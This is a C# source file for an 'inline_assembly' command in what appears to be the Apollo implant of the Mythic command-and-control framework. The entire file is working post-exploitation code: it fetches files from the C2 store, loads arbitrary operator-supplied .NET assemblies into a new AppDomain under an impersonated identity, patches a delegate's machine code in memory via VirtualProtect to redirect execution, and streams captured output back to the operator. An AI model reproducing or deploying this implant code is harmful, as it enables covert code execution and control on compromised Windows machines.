#define COMMAND_NAME_UPPER

#if DEBUG
#define INLINE_ASSEMBLY
#endif

#if INLINE_ASSEMBLY

using System;
using System.Linq;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using System.Threading;
using System.IO;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using ApolloInterop.Classes.Api;
using ApolloInterop.Utils;

namespace Tasks
{
    public class inline_assembly : Tasking
    {
        [DataContract]
        internal struct InlineAssemblyParameters
        {
            [DataMember(Name = "assembly_name")]
            public string AssemblyName;
            [DataMember(Name = "assembly_arguments")]
            public string AssemblyArguments;

            [DataMember(Name = "interop_id")] public string InteropFileId;
        }
        
        private delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        private readonly VirtualProtect _pVirtualProtect;

        private delegate IntPtr CommandLineToArgvW(
            [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
            out int pNumArgs);

        private readonly CommandLineToArgvW _pCommandLineToArgvW;
        
        private delegate IntPtr LocalFree(IntPtr hMem);

        private readonly LocalFree _pLocalFree;

        private static readonly AutoResetEvent Complete = new AutoResetEvent(false);
        
        private readonly Action<object> _sendAction;

        private System.Threading.Tasks.Task _sendTask = null;

        private static string _output = "";

        private static bool _completed = false;

        private Thread _assemblyThread;
        
        public inline_assembly(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {
            _pVirtualProtect = agent.GetApi().GetLibraryFunction<VirtualProtect>(Library.KERNEL32, "VirtualProtect");
            _pCommandLineToArgvW =
                agent.GetApi().GetLibraryFunction<CommandLineToArgvW>(Library.SHELL32, "CommandLineToArgvW");
            _pLocalFree = agent.GetApi().GetLibraryFunction<LocalFree>(Library.KERNEL32, "LocalFree");
            _sendAction = o =>
            {
                string accumOut = "";
                string slicedOut = "";
                int lastOutLen = 0;
                /* Unfortunately, with the way the way Cross AppDomain delegates work,
                 * we can't invoke functions on private members of the parent class.
                 * Instead, we have to take the approach of managing concurrent access
                 * with the agent's output mutex. So long as we have acquired the mutex,
                 * we ensure we're the only one accessing the static _output variable.
                 * Then each second, we see what "new" output has been posted by the cross
                 * AppDomain delegate function. If there is new output, we take the segment
                 * of the string that is new, and post it to Mythic.
                 */
                while (!_completed && !_cancellationToken.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                        Complete
                    }, 1000);
                    accumOut = _output;
                    slicedOut = accumOut.Skip(lastOutLen).Aggregate("", (current, s) => current + s);
                    lastOutLen = accumOut.Length;
                    if (!string.IsNullOrEmpty(slicedOut))
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                            slicedOut,
                            false,
                            ""));
                    }
                }
                
                slicedOut = _output.Skip(lastOutLen).Aggregate("", (current, s)=> current + s);
                if (!string.IsNullOrEmpty(slicedOut))
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                        slicedOut,
                        false,
                        ""));
                }
            };
        }
        
        private string[] ParseCommandLine(string cmdline)
        {
            int numberOfArgs;
            IntPtr ptrToSplitArgs;
            string[] splitArgs;

            ptrToSplitArgs = _pCommandLineToArgvW(cmdline, out numberOfArgs);

            // CommandLineToArgvW returns NULL upon failure.
            if (ptrToSplitArgs == IntPtr.Zero)
                throw new ArgumentException("Unable to split argument.", new Win32Exception());

            // Make sure the memory ptrToSplitArgs to is freed, even upon failure.
            try
            {
                splitArgs = new string[numberOfArgs];

                // ptrToSplitArgs is an array of pointers to null terminated Unicode strings.
                // Copy each of these strings into our split argument array.
                for (int i = 0; i < numberOfArgs; i++)
                    splitArgs[i] = Marshal.PtrToStringUni(Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));

                return splitArgs;
            }
            finally
            {
                // Free memory obtained by CommandLineToArgW.
                _pLocalFree(ptrToSplitArgs);
            }
        }

        public override void Kill()
        {
            _assemblyThread.Abort();
            _completed = true;
            _cancellationToken.Cancel();
            Complete.Set();
        }


        public override void Start()
        {
            MythicTaskResponse resp;
            TextWriter realStdOut = Console.Out;
            TextWriter realStdErr = Console.Error;
            try
            {
                /*
                     * This output lock ensures that we're the only ones that are manipulating the static
                     * variables of this class, such as:
                     * - _output
                     * - _completed
                     * These variables communicate across the AppDomain boundary (as they're simple types).
                     * Output is managed by the _sendTask.
                     */
                _agent.AcquireOutputLock();
                byte[] interopBytes = new byte[0];
                InlineAssemblyParameters parameters = _jsonSerializer.Deserialize<InlineAssemblyParameters>(_data.Parameters);
                if (!_agent.GetFileManager().GetFileFromStore(parameters.InteropFileId, out interopBytes))
                {
                    if (_agent.GetFileManager().GetFile(
                            _cancellationToken.Token,
                            _data.ID,
                            parameters.InteropFileId,
                            out interopBytes
                        ))
                    {
                        _agent.GetFileManager().AddFileToStore(parameters.InteropFileId, interopBytes);
                    }
                }

                if (interopBytes.Length != 0)
                {
                    if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
                    {
                        string[] stringData = string.IsNullOrEmpty(parameters.AssemblyArguments)
                            ? new string[0]
                            : ParseCommandLine(parameters.AssemblyArguments);
                        
                        _sendTask = System.Threading.Tasks.Task.Factory.StartNew(_sendAction, _cancellationToken.Token);
                        (bool loadedModule, string optionalMessage) = LoadAppDomainModule(stringData, assemblyBytes, new byte[][] { interopBytes });
                        if (loadedModule)
                        {
                            resp = CreateTaskResponse("", true);
                        }
                        else
                        {
                            resp = CreateTaskResponse($"Failed to load module. \n {optionalMessage}", true, "error");
                        }
                    }
                    else
                    {
                        resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
                    }
                }
                else
                {
                    resp = CreateTaskResponse("Failed to get ApolloInterop dependency.", true, "error");
                }
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
            }
            finally
            {
                Console.Out.Flush();
                Console.Error.Flush();
                Console.SetOut(realStdOut);
                Console.SetError(realStdErr);
                _completed = true;
                Complete.Set();
                if (_sendTask != null)
                {
                    _sendTask.Wait();
                }

                _completed = false;
                _output = "";
                _agent.ReleaseOutputLock();
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }

        #region AppDomain Management
        private (bool,string) LoadAppDomainModule(String[] sParams, Byte[] bMod, Byte[][] dependencies)
        {
            bool bRet = false;
            AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
            try
            {
                isolationDomain.SetThreadPrincipal(new WindowsPrincipal(_agent.GetIdentityManager().GetCurrentImpersonationIdentity()));
                isolationDomain.SetData("str", sParams);
                bool defaultDomain = AppDomain.CurrentDomain.IsDefaultAppDomain();
                // Load dependencies wrapped into a try catch to avoid non critical loading failures from causing the entire module to fail
                foreach (byte[] dependency in dependencies)
                {
                    try
                    {
                        isolationDomain.Load(dependency);
                    }
                    catch (Exception e)
                    {
                        DebugHelp.DebugWriteLine(e.Message);
                    }
                }
                try
                {
                    isolationDomain.Load(bMod);
                }
                catch (Exception e)
                {
                    DebugHelp.DebugWriteLine(e.Message);
                }
                var sleeve = new CrossAppDomainDelegate(Console.Beep);
                var ace = new CrossAppDomainDelegate(ActivateLoader);

                RuntimeHelpers.PrepareDelegate(sleeve);
                RuntimeHelpers.PrepareDelegate(ace);


                var flags = BindingFlags.Instance | BindingFlags.NonPublic;
                var codeSleeve = (IntPtr)sleeve.GetType().GetField("_methodPtrAux", flags).GetValue(sleeve);
                var codeAce = (IntPtr)ace.GetType().GetField("_methodPtrAux", flags).GetValue(ace);

                if (codeSleeve == IntPtr.Zero || codeAce == IntPtr.Zero)
                {
                    return (bRet, "Failed to get method pointers");
                }
                int[] patch = new int[3];

                patch[0] = 10;
                patch[1] = 11;
                patch[2] = 12;

                uint oldprotect = 0;
                if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), 0x4, out oldprotect))
                {
                    return (bRet, "Failed to change memory protection");
                }
                Marshal.WriteByte(codeSleeve, 0x48);
                Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
                Marshal.WriteIntPtr(IntPtr.Add(codeSleeve, 2), codeAce);
                Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[0]), 0xff);
                Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);
                if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), oldprotect, out oldprotect))
                {
                    return (bRet, "Failed to change memory protection");
                }
                
                try
                {
                    _assemblyThread = new Thread(() =>
                    {
                        isolationDomain.DoCallBack(sleeve);
                    });
                    _assemblyThread.Start();
                    _assemblyThread.Join();
                    bRet = true;
                }
                catch (Exception ex)
                {
                    
                }
                return (bRet,"");

            }
            catch (Exception e)
            {
                return (bRet, e.Message);
            }
            finally
            {
                UnloadAppDomain(isolationDomain);
            }
        }
        
        private static void UnloadAppDomain(AppDomain oDomain)
        {
            AppDomain.Unload(oDomain);
        }
#endregion
#region Cross AppDomain Loader
        static void ActivateLoader()
        {
            void OnWrite(object sender, object args)
            {
                Assembly interop2 = null;
                foreach (var asm2 in AppDomain.CurrentDomain.GetAssemblies())
                {
                    if (asm2.FullName.StartsWith("ApolloInterop"))
                    {
                        interop2 = asm2;
                        break;
                    }
                }
                if (interop2 == null)
                {
                    return;
                }
                Type tStringEventArgs = interop2.GetType("ApolloInterop.Classes.Events.StringDataEventArgs");
                FieldInfo fiData = tStringEventArgs.GetField("Data");
                string data = fiData.GetValue(args) as string;
                if (!string.IsNullOrEmpty(data))
                {
                    _output += data;
                }
            }
            Assembly interopAsm = null;
            foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (asm.FullName.StartsWith("ApolloInterop"))
                {
                    interopAsm = asm;
                }
            }

            if (interopAsm == null)
            {
                throw new Exception("Failed to find interop dll");
            }


            string[] str = AppDomain.CurrentDomain.GetData("str") as string[];

            var callbackMethod = (EventHandler<EventArgs>)OnWrite;
            
            
            Type tWriter = interopAsm.GetType("ApolloInterop.Classes.IO.EventableStringWriter");

            var writer = Activator.CreateInstance(tWriter);
            EventInfo eiWrite = tWriter.GetEvent("BufferWritten");
            Delegate handler = Delegate.CreateDelegate(
                eiWrite.EventHandlerType,
                callbackMethod.Method);
            eiWrite.AddEventHandler(writer, handler);
            
            Console.SetOut((StringWriter)writer);
            Console.SetError((StringWriter)writer);
            foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (!asm.FullName.Contains("mscorlib") && !asm.FullName.Contains("Apollo"))
                {
                    var costuraLoader = asm.GetType("Costura.AssemblyLoader", false);
                    if (costuraLoader != null)
                    {
                        var costuraLoaderMethod = costuraLoader.GetMethod("Attach", BindingFlags.Public | BindingFlags.Static);
                        if (costuraLoaderMethod != null)
                        {
                            costuraLoaderMethod.Invoke(null, new object[] { });   
                        }
                    }

                    try
                    {
                        asm.EntryPoint.Invoke(null, new object[] {str});
                    }
                    catch (System.Exception ex)
                    {
                        Console.WriteLine(ex.InnerException?.Message);
                        Console.WriteLine(ex.InnerException?.StackTrace);
                    }
                    Console.Out.Flush();
                    Console.Error.Flush();
                }
            }
        }
#endregion
    }
}
#endif